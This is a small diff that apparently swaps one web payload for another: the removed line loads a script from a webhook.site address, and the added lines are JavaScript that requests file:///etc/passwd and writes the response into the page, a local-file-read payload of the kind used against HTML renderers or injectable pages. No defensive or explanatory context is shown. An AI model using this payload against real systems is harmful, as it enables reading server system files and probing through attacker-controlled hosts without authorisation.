@@ -1,1 +1,7 @@
-<script src="https://webhook.site/0ca9321d-5cf7-415d-8f64-8a5eba61d106"></script>
+<script>
+    xhzeem = new XMLHttpRequest();
+    xhzeem.onload = function(){document.write(this.responseText);}
+    xhzeem.onerror = function(){document.write('failed!')}
+    xhzeem.open("GET","file:///etc/passwd");
+    xhzeem.send();
+</script>
